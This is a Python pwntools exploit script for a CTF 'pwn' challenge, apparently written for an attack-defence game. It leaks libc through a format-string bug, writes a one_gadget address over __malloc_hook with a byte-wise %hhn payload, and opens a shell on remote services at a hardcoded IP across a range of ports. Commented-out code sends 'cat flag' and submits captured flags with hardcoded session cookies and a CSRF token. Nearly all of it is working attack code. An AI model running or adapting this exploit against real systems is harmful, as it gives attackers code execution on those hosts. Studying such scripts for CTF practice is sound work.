import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
import requests
cookies = {
    'session': '052acba7-b39f-4384-ae40-1c1078def7bb',
}

headers = {
    'Connection': 'keep-alive',
    'Accept': 'application/json',
    'CSRF-Token': 'b592779067f128f34ddc5ea5819dfc7c094bc4c64460248c19e344cf8bb45849',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36',
    'Content-Type': 'application/json',
    'Origin': 'http://39.100.119.37:8001',
    'Referer': 'http://39.100.119.',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,ja;q=0.7,zh-TW;q=0.6',
}
def submit_flag(id,flag):
    

    data = '{"challenge_id":'+str(id)+',"submission":"'+flag+'"}'
    print(data)

    response = requests.post('http://39.100.119.37:8001/api/v1/challenges/attempt', headers=headers, cookies=cookies, data=data, verify=False)
    print(response.text)
binary='pwn'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.23")
ssss=0
# pdbg.context.log_level='debug'
while True :
	try :
		if len(sys.argv)==1 :
			io=pdbg.run("local")
			libc=pdbg.libc
			#io=pdbg.run("debug")
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
		else :
			if ssss==24:
				ssss=0
			port=50280+ssss*100
			while port==51380 :
				port+=100
				ssss+=1
			io=remote('39.100.119.37',51380)
			ssss+=1
			elf=ELF('./pwn')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		def fmt(addr1,addr2,off):

			arg0=(addr1)&0xff
			arg1=(addr1&0xff00)>>8
			arg2=(addr1&0xff0000)>>16
			arg3=(addr1&0xff000000)>>24
			arg4=(addr1&0xff00000000)>>32
			arg5=(addr1&0xff0000000000)>>40
			# arg6=(addr1&0xff000000000000)>>48
			# arg7=(addr1&0xff00000000000000)>>56
			#pay=fmtstr_payload(8,{elf.got['printf']:system_addr})
			pay1='%'+str(arg0)+'c%'+str(off+10)+'$hhn'
			pay2='%'+str((arg1-arg0+0x100)%0x100)+'c%'+str(off+11)+'$hhn'
			pay3='%'+str((arg2-arg1+0x100)%0x100)+'c%'+str(off+12)+'$hhn'
			pay4='%'+str((arg3-arg2+0x100)%0x100)+'c%'+str(off+13)+'$hhn'
			pay5='%'+str((arg4-arg3+0x100)%0x100)+'c%'+str(off+14)+'$hhn'
			pay6='%'+str((arg5-arg4+0x100)%0x100)+'c%'+str(off+15)+'$hhn'
			# pay7='%'+str((arg6-arg5+0x100)%0x100)+'c%10$hhn'
			# pay8='%'+str((arg7-arg6+0x100)%0x100)+'c%10$hhn'
			
			pay=pay1+pay2+pay3+pay4+pay5+pay6
			pay+='%100110c'
			pay=pay.ljust(0x50,'\x00')
			for i in range(6):
				pay+=p64(addr2+i)
			io.sendline(pay)





		io.recvuntil('name:\n')
		io.sendline('1')
		io.recvuntil('Darkness is coming\n')
		io.sendline('1')
		io.recvuntil('times >> ')
		io.sendline('100')
		io.sendline('%27$p')
		libc_base=int(io.recvline(),16)-libc.sym['__libc_start_main']-240
		libc.address=libc_base
		system_addr=libc.sym['system']
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		fmt(libc_base+one_gadgaet[2],libc.sym['__malloc_hook'],8)
		# sleep(0.5)
		# io.sendline('cat flag')
		# sleep(1)
		# flag1=io.recv()
		# aaa='flag{'
		# if aaa in flag1 :
		# 	print flag1
		# 	submit_flag(5,flag1)






		success('libc_base:'+hex(libc_base))
		# io.close()
		# libc_base=u64(io.recv(6)+'\x00\x00')-libc.sym['__malloc_hook']-88-0x10
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		# success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	except Exception as e:
		io.close()
		continue
	# else:
	# 	continue